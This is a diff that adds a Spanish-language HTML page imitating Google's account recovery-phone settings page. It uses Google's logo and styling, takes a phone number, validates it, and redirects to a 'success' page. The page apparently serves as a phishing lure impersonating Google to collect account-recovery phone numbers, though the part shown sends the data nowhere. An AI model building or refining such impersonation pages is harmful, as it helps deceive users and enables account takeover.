@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Teléfono de recuperación</title>
+<!-- Google Fonts: se incluye Roboto para complementar las fuentes propietarias -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  color: #333;
+  background-color: #fff;
+  min-height: 100vh;
+ 
+}
+
+
+
+html, body{
+ height: 100%;     /* Permite usar el 100% de la altura de la ventana */
+  margin: 0;        /* Elimina márgenes por defecto */
+  padding: 0; }
+
+
+  /* Contenedor que envuelve header, nav, content y footer */
+.page-wrapper {
+  display: flex;
+  flex-direction: column; /* Hace que el contenido fluya de arriba abajo */
+  min-height: 100vh;      /* Ocupa al menos toda la altura de la pantalla */
+}
+
+/* El contenido principal crece para ocupar el espacio sobrante,
+   empujando el footer hacia el fondo */
+.content {
+  flex: 1; /* Crece para ocupar espacio disponible */
+}
+
+/* Contenedor principal de la barra */
+.header-bar {
+  display: flex;
+  align-items: center;      /* Alinea verticalmente al centro */
+  justify-content: space-between; /* Separa a izquierda y derecha */
+  padding: 8px 16px;
+  box-sizing: border-box;
+  margin-top: 9px;
+}
+
+/* Sección izquierda: Logo de Google + texto "Cuenta" */
+.left-side {
+  display: flex;
+  align-items: center;
+}
+.left-side img {
+  height: 32px;  /* Ajusta si deseas otro tamaño de logo */
+}
+.left-side .cuenta {
+  font-family: "Product Sans", Arial, sans-serif;
+  color: rgb(95, 99, 104); /* Color del texto "Cuenta" */
+  font-size: 22px;
+  font-weight: 400;
+  margin-left: 8px; /* Espacio entre el logo y el texto "Cuenta" */
+}
+
+/* Sección derecha: íconos */
+.right-side {
+  display: flex;
+  align-items: center;
+  gap: 16px; /* Espacio entre los íconos */
+}
+.icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+.icon svg {
+  width: 24px;
+  height: 24px;
+  fill: #5f6368; /* Color de los íconos */
+}
+/* Estilo para la “G” con fondo verde */
+.profile {
+  width:32px;
+  height: 32px;
+  border-radius: 50%;  /* Esto crea la forma circular */
+overflow: hidden;    /* Esto oculta las partes de la imagen que se salen del círculo */
+display: inline-block; /* Para que se comporte bien si lo pones junto a otros elementos */
+vertical-align: middle; /* Ayuda a alinear verticalmente si está junto a texto */
+}
+.profile img {
+display: block;     /* Elimina posible espacio extra debajo de la imagen */
+width: 100%;        /* Hace que la imagen ocupe todo el ancho del contenedor */
+height: 100%;       /* Hace que la imagen ocupe todo el alto del contenedor */
+object-fit: cover;  /* Escala la imagen para mantener su aspecto y llenar el div, recortando si es necesario */
+}
+.nav {
+  display: flex;
+  align-items: center;
+  padding: 16px 20px;
+  border-bottom: 1px solid #e0e0e0;
+}
+
+.back-arrow {
+  margin-right: 20px;
+  color: #5f6368;
+  cursor: pointer;
+}
+
+.title {
+  font-size: 24px;
+  font-weight: 400;
+  margin: 0;
+  color: rgb(32, 33, 36);
+  /* "Google Sans" es propietaria, se usará Roboto o Arial */
+  font-family: "Google Sans", Roboto, Arial;
+}
+
+.content {
+  padding: 20px;
+  max-width: 800px;
+  margin: 0 auto;
+ 
+}
+
+.info-text {
+  margin-bottom: 12px;
+  line-height: 1.5;
+  color: rgba(0, 0, 0, 0.65);
+  font-family: Roboto, Arial;
+}
+
+.more-info {
+  color:rgb(11, 87, 208);
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.more-info-icon {
+  width: 15px;
+  height: 15px;
+  vertical-align: middle;
+  color:rgb(11, 87, 208);
+}
+
+.phone-card {
+border: 1px solid #e0e0e0;
+border-radius: 8px;
+padding: 20px;
+margin-bottom: 20px;
+max-width: 600px; /* O el ancho máximo deseado */
+margin-left: auto;
+margin-right: auto;
+
+padding: 20px;
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.phone-container {
+display: flex;
+align-items: flex-start; /* Alinear al inicio por si el botón salta de línea */
+flex-wrap: wrap;       /* ¡Importante! Permite que los elementos salten de línea */
+gap: 15px;             /* Espacio entre el grupo input/bandera y el botón */
+/* margin-bottom: 20px; Eliminado, el padding de .phone-card o gap maneja el espacio */
+
+}
+
+/* NUEVO: Estilos para el grupo de bandera e input */
+.input-flag-group {
+display: flex;
+align-items: center; /* Alinea bandera e input verticalmente */
+flex-grow: 1;        /* Hace que este grupo intente ocupar el espacio disponible */
+min-width: 200px;    /* Evita que el input se encoja demasiado antes de que salte el botón */
+position: relative;  /* Contexto para el mensaje de error si se necesita posicionamiento absoluto */
+
+max-width: 300px; /* Evita que el grupo se expanda demasiado */
+}
+
+.flag {
+margin-right: 10px;
+font-size: 24px; /* Un poco más grande quizás? */
+flex-shrink: 0;  /* Evita que la bandera se encoja */
+}
+
+/* NUEVO: Wrapper para input y error */
+.input-wrapper {
+flex-grow: 1; /* El contenedor del input ocupa el espacio restante dentro del grupo */
+/* No necesita display: flex si input y error son block */
+max-width: 400px; /* Evita que el input se expanda más allá de su contenedor */
+
+}
+
+.phone-input {
+/* flex-grow: 1; Eliminado, su wrapper ahora controla el crecimiento */
+width: 100%;      /* Ocupa todo el ancho de su wrapper */
+padding: 10px 12px; /* Ajuste de padding */
+border: 1px solid #dadce0;
+border-radius: 4px;
+font-size: 16px;
+/* margin-right: 10px; Eliminado, el gap del container padre lo maneja */
+box-sizing: border-box; /* Asegura que padding/border no aumenten el tamaño total */
+}
+
+.phone-input.error {
+border-color: #ea4335;
+}
+
+.error-message {
+color: #ea4335;
+font-size: 13px;
+margin-top: 5px;
+/* margin-bottom:15px; Eliminado, el padding inferior de phone-card da espacio */
+display: none;
+width: 100%; /* Asegura que ocupa el ancho debajo del input */
+}
+
+.update-btn {
+background-color: #1a73e8;
+color: white;
+border: none;
+border-radius: 24px; /* Más redondeado */
+padding: 10px 24px; /* Padding ajustado */
+font-size: 14px;
+font-weight: 500;
+cursor: pointer;
+transition: background-color 0.3s, box-shadow 0.3s;
+text-align: center;
+white-space: nowrap; /* Evita que el texto del botón se rompa en dos líneas */
+box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); /* Sombra más sutil */
+flex-shrink: 0; /* Evita que el botón se encoja */
+height: fit-content; /* Ajusta altura al contenido */
+align-self: center; /* Centra el botón verticalmente si hay espacio extra (opcional) */
+}
+
+.update-btn:hover {
+background-color: #1765cc;
+box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+}
+
+.other-numbers {
+
+margin-top: 20px; /* Separación del contenedor del teléfono */
+margin-bottom: 20px; /* Separación del contenedor del teléfono */
+padding-top: 15px; /* Separación de la línea */
+border-top: 1px solid #e0e0e0;
+color: rgb(60, 64, 67);
+font-family: Roboto, Arial, sans-serif; /* Fuente más estándar de Google */
+}
+
+.other-numbers-text {
+color: rgb(60, 64, 67);
+font-size:14px;
+font-weight:400;
+}
+
+.manage-link {
+color:rgb(11, 87, 208);
+text-decoration: none;
+cursor: pointer;
+font-size:14px;
+font-weight:500; /* Un poco más de peso para el enlace */
+padding: 5px; /* Área de click un poco más grande */
+border-radius: 4px;
+}
+.manage-link:hover {
+text-decoration: underline;
+background-color: rgba(11, 87, 208, 0.05); /* Fondo sutil al pasar el ratón */
+}
+
+
+
+.footer-link {
+  margin-right: 20px;
+  color: #5f6368;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.profile-circle {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background-color: #4caf50;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.notification {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background-color: white;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+  z-index: 1000;
+  text-align: center;
+  max-width: 90%;
+  width: 400px;
+  display: none;
+}
+
+.notification-title {
+  font-size: 18px;
+  font-weight: 500;
+  margin-bottom: 10px;
+  color: #0f9d58;
+}
+
+.notification-text {
+  margin-bottom: 20px;
+  line-height: 1.5;
+}
+
+.countdown {
+  font-weight: bold;
+}
+
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(0, 0, 0, 0.5);
+  z-index: 999;
+  display: none;
+}
+
+@media (max-width: 600px) {
+  .phone-container {
+   justify-content: center;
+  }
+  
+  .phone-input {
+    width: 100%;
+    margin-bottom: 10px;
+    margin-right: 0;
+  }
+  
+  .other-numbers {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+  
+  .manage-link {
+    margin-top: 10px;
+  }
+  
+  .footer {
+    overflow-x: auto;
+    white-space: nowrap;
+  }
+}
+  /* Footer al final, sin position fixed */
+.footer {
+  padding: 15px 20px;
+  background-color: #f8f9fa;
+  box-sizing: border-box;
+  color: rgb(68, 71, 70);
+  font-size: 14px;
+  font-family: "Google Sans Text", "google sans", Roboto, Arial;
+  border-top: 1px solid #e0e0e0; /* línea superior para separar */
+}
+
+/* Estilos base para todos los íconos de bandera que usan este sprite */
+.flag-icon {
+  /* Imagen grande (sprite sheet) que contiene todas las banderas */
+  background-image: url(//ssl.gstatic.com/i18n/flags/48x32/nobevel/33ca1b14e4ec27c98427bb32c0890b5f/flags.png);
+  background-repeat: no-repeat;
+
+  /* Tamaño al que se escala la imagen sprite COMPLETA */
+  background-size: 24px 4012px;
+
+  /* Dimensiones del contenedor (la "ventana" que muestra la bandera) */
+  width: 24px;
+  height: 16px;
+
+  /* Oculta las partes de la imagen sprite que no caben en el contenedor */
+  overflow: hidden;
+
+  /* Para que se comporte como un ícono inline y se pueda alinear con texto */
+  display: inline-block;
+  vertical-align: middle;
+}
+
+/* Posición específica para la bandera de Argentina (AR) */
+.flag-icon.flag-ar {
+  /* Mueve la imagen de fondo para que la bandera AR quede visible */
+  /* Los valores (-1px horizontal, -3282px vertical) vienen del código original */
+  background-position: -1px -3282px;
+  display: inline-block;
+  margin-right: 10px; /* Espacio entre la bandera y el input */
+}
+
+/* --- EJEMPLOS PARA OTRAS BANDERAS --- */
+/* Si quisieras añadir la bandera de España (ES) o USA (US), necesitarías
+   encontrar sus coordenadas Y correctas dentro del archivo flags.png
+   y crear reglas CSS similares: */
+
+/*
+.flag-icon.flag-es {
+  background-position: -1px -YYYYpx; // Reemplaza YYYY con la posición Y correcta para España
+}
+
+.flag-icon.flag-us {
+  background-position: -1px -ZZZZpx; // Reemplaza ZZZZ con la posición Y correcta para USA
+}
+*/
+</style>
+</head>
+<script>
+    // Espera a que el DOM esté completamente cargado
+    document.addEventListener('DOMContentLoaded', function() {
+
+        const phoneInput = document.getElementById('phoneInput');
+        const errorDiv = document.getElementById('errorMessage');
+        const updateButton = document.getElementById('updateButton');
+
+        // Verifica que los elementos existan antes de añadir listeners
+        if (updateButton && phoneInput && errorDiv) {
+            updateButton.addEventListener('click', function() {
+                // 1. Ocultar errores previos al hacer clic
+                errorDiv.style.display = 'none';
+                phoneInput.classList.remove('error');
+
+                // 2. Obtener y limpiar el valor del input
+                const phoneNumber = phoneInput.value.trim();
+
+                // 3. Validar:
+                //    - No debe estar vacío.
+                //    - Debe contener solo dígitos (usando una expresión regular /^\d+$/).
+                //    - Debe tener al menos 10 dígitos (ajusta si necesitas otra longitud).
+                const isValid = phoneNumber.length >= 10 && /^\d+$/.test(phoneNumber);
+
+                // 4. Reaccionar a la validación
+                if (!isValid) {
+                    // Validación fallida: Mostrar el mensaje de error
+                    errorDiv.style.display = 'block'; // Muestra el div del mensaje
+                    // Añadir clase de error al input para el borde rojo
+                    phoneInput.classList.add('error');
+                    console.log('Validación de teléfono fallida:', phoneNumber);
+                } else {
+                    // Validación exitosa: Redirigir
+                    console.log('Validación de teléfono exitosa. Redirigiendo a phone-update-success.html...');
+                    // Cambia la ubicación de la ventana a la página de éxito
+                    window.location.href = 'phone-update-success.html';
+                }
+            });
+
+             // Opcional: Limpiar error cuando el usuario empieza a escribir de nuevo para mejor UX
+             phoneInput.addEventListener('input', function() {
+                 if (phoneInput.classList.contains('error')) {
+                      errorDiv.style.display = 'none';
+                      phoneInput.classList.remove('error');
+                 }
+             });
+
+        } else {
+            // Informar si falta algún elemento esencial
+            if (!updateButton) console.error('Error: Botón "Actualizar" (id="updateButton") no encontrado.');
+            if (!phoneInput) console.error('Error: Input de teléfono (id="phoneInput") no encontrado.');
+            if (!errorDiv) console.error('Error: Div de mensaje de error (id="errorMessage") no encontrado.');
+        }
+    });
+</script>
+<body>
+<div class="page-wrapper">
+<div class="header-bar">
+<!-- Sección izquierda: Logo Google + Texto -->
+<div class="left-side">
+  <!-- Logo oficial de Google (puedes cambiarlo por texto si lo deseas) -->
+  <img 
+    src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_116x41dp.png" 
+    alt="Google" 
+  />
+  <span class="cuenta">Cuenta</span>
+</div>
+
+<!-- Sección derecha: Íconos -->
+<div class="right-side">
+  <!-- Ícono 1: Reemplazado con el nuevo SVG -->
+<div class="icon">
+<svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M478-240q21 0 35.5-14.5T528-290q0-21-14.5-35.5T478-340q-21 0-35.5 14.5T428-290q0 21 14.5 35.5T478-240Zm-36-154h74q0-33 7.5-52t42.5-52q26-26 41-49.5t15-56.5q0-56-41-86t-97-30q-57 0-92.5 30T342-618l66 26q5-18 22.5-39t53.5-21q32 0 48 17.5t16 38.5q0 20-12 37.5T506-526q-44 39-54 59t-10 73Zm38 314q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Zm0-80q134 0 227-93t93-227q0-134-93-227t-227-93q-134 0-227 93t-93 227q0 134 93 227t227 93Zm0-320Z"/></s>
+</div>
+
+  <!-- Ícono 2: El ícono de cuadrícula de Google Apps -->
+  <div class="icon">
+   <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M240-160q-33 0-56.5-23.5T160-240q0-33 23.5-56.5T240-320q33 0 56.5 23.5T320-240q0 33-23.5 56.5T240-160Zm240 0q-33 0-56.5-23.5T400-240q0-33 23.5-56.5T480-320q33 0 56.5 23.5T560-240q0 33-23.5 56.5T480-160Zm240 0q-33 0-56.5-23.5T640-240q0-33 23.5-56.5T720-320q33 0 56.5 23.5T800-240q0 33-23.5 56.5T720-160ZM240-400q-33 0-56.5-23.5T160-480q0-33 23.5-56.5T240-560q33 0 56.5 23.5T320-480q0 33-23.5 56.5T240-400Zm240 0q-33 0-56.5-23.5T400-480q0-33 23.5-56.5T480-560q33 0 56.5 23.5T560-480q0 33-23.5 56.5T480-400Zm240 0q-33 0-56.5-23.5T640-480q0-33 23.5-56.5T720-560q33 0 56.5 23.5T800-480q0 33-23.5 56.5T720-400ZM240-640q-33 0-56.5-23.5T160-720q0-33 23.5-56.5T240-800q33 0 56.5 23.5T320-720q0 33-23.5 56.5T240-640Zm240 0q-33 0-56.5-23.5T400-720q0-33 23.5-56.5T480-800q33 0 56.5 23.5T560-720q0 33-23.5 56.5T480-640Zm240 0q-33 0-56.5-23.5T640-720q0-33 23.5-56.5T720-800q33 0 56.5 23.5T800-720q0 33-23.5 56.5T720-640Z"/></svg>
+  </div>
+
+  <!-- Ícono 3: Círculo con la letra "G" -->
+  <div class="profile">
+    <img src="https://lh3.googleusercontent.com/a/default-user=s40-p">
+  </div>
+</div>
+</div>
+
+<div class="nav">
+<div class="back-arrow">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <line x1="19" y1="12" x2="5" y2="12"></line>
+    <polyline points="12 19 5 12 12 5"></polyline>
+  </svg>
+</div>
+<h1 class="title">Teléfono de recuperación</h1>
+</div>
+
+<div class="content">
+<div class="info-text">
+  Usamos el teléfono de recuperación para comunicarnos contigo en caso de que detectemos actividad inusual en tu cuenta o si pierdes acceso accidentalmente.
+</div>
+
+<div class="info-text">
+  Cuando cambies el teléfono de recuperación, es posible que se te de la opción de recibir códigos de acceso en el teléfono de recuperación anterior por una semana. 
+  <a href="#" class="more-info">Más información
+    <svg class="more-info-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"></circle>
+      <line x1="12" y1="16" x2="12" y2="12"></line>
+      <line x1="12" y1="8" x2="12.01" y2="8"></line>
+    </svg>
+  </a>
+</div>
+
+<div class="phone-card">
+<div class="phone-container">
+<!-- NUEVO: Grupo para bandera e input -->
+<div class="input-flag-group">
+   <span class="flag-icon flag-ar" title="Bandera de Argentina"></span>
+  <!-- Contenedor original del input y error -->
+  <div class="input-wrapper">
+    <input type="tel" id="phoneInput" class="phone-input" placeholder="Ingrese número de teléfono" value="">
+    <div id="errorMessage" class="error-message">Número inválido. Debe tener al menos 10 dígitos.</div>
+  </div>
+</div>
+<!-- El botón queda como un elemento flex separado -->
+<button id="updateButton" class="update-btn">Actualizar</button>
+</div>
+
+<!-- ... (código de .other-numbers si existe) ... -->
+<div class="other-numbers">
+  <span class="other-numbers-text">Es posible que haya otros números asociados a tu Cuenta de teléfono.</span><a href="#" class="manage-link">Administrar tus números</a>
+</div>
+
+</div>
+</div>
+
+<div class="footer">
+<a href="#" class="footer-link">Privacidad</a>
+<a href="#" class="footer-link">Condiciones</a>
+<a href="#" class="footer-link">Ayuda</a>
+<a href="#" class="footer-link">Información</a>
+</div>
+
+<div id="overlay" class="overlay"></div>
+
+
+
+</body>
+</html>
